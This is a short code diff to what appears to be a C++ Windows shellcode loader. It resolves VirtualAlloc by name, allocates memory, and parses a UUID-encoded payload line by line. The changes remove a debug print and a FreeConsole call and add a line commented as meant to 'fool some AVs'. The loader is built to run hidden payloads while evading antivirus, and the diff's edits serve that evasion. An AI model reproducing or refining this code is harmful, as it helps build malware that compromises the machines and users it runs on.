@@ -126,8 +126,6 @@ int main(int argc, char *argv[])
 
         char key[]{XOR_KEY};
 
-        FreeConsole();
-
         if (strstr(argv[0], EXE_NAME) == NULL)
         {
                 return -2;
@@ -177,13 +175,12 @@ int main(int argc, char *argv[])
                 char chars_array[UUID_LINE_LEN]{};
                 DWORD oldprotect{0};
                 char *temp{};
-                printf("1 %s\n", payload);
 
-                const char vAlloc[13]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
                 pMVA = GetProcAddress(k32_handle, vAlloc);
                 PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                DWORD_PTR hptr = (DWORD_PTR)mem;
+                DWORD_PTR hptr = reinterpret_cast<DWORD_PTR>(mem);
 
+                int i{}; // fool some AVs. maybe give them a detour :)
                 for (temp = strtok((char *)payload, "\n"); temp;)
                 {
                         strncpy(chars_array, temp, UUID_LINE_LEN);
